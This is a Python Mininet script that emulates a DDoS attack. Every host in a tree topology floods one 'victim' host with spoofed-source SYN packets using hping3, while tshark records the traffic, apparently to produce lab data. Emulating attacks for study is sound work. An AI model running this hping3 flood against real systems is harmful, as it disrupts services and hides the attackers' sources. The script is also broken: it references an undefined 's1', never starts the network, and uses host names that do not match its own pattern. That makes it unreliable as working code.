#!/usr/bin/env python3

from mininet.log import setLogLevel
import networks

def test(n_switch=2, k_hosts=2, seconds=10):
    net = networks.tree(n_switch, k_hosts)

    victim = net.get('h01')
    listner = net.get('h02')

    switch = []
    hosts = []

    for i in range(1, n_switch+1):
        switch.append(net.get(f's{i}'))
        for j in range(1, k_hosts+1):
            hosts.append(net.get(f'h{i-1}{j}'))

    # Start the traffic snif
    s1.cmd(f'timeout {seconds + 1} tshark -i s1-eth1 -f "dst host {victim.IP()} and not arp" -w ddos_snif.pcap')

    # Start the attack from N hosts
    for host in hosts:
        host.cmd(f'timeout {seconds} hping3 -S -p 80 --rand-source -d 1000 --faster {victim.IP()} &')

    net.stop()

if __name__ == '__main__':
    setLogLevel('info')
    test()
